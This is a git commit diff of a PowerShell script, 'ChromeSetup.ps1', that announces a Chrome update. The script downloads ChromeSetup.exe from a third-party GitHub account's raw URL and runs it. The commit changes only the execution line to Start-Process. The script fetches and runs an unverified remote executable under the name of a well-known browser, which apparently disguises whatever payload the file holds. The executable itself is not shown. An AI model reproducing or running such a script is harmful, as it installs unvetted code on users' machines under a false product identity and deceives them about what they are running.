044b7435e9de6b14f5cb414a6e48b2ec1e0366d9
altonetworks <fevtoshi@gmail.com>
2026-08-01 14:49:06 +0700

    Update ChromeSetup.ps1

--- releases/151.0.7922.72/ChromeSetup.ps1
+++ releases/151.0.7922.72/ChromeSetup.ps1
@@ -2,4 +2,4 @@ Clear-Host
 
 echo "[*] Updating Chrome..."
 wget https://raw.githubusercontent.com/altonetworks/chrome/refs/heads/main/releases/151.0.7922.72/ChromeSetup.exe -OutFile ChromeSetup.exe
-.\ChromeSetup.exe
+Start-Process .\ChromeSetup.exe
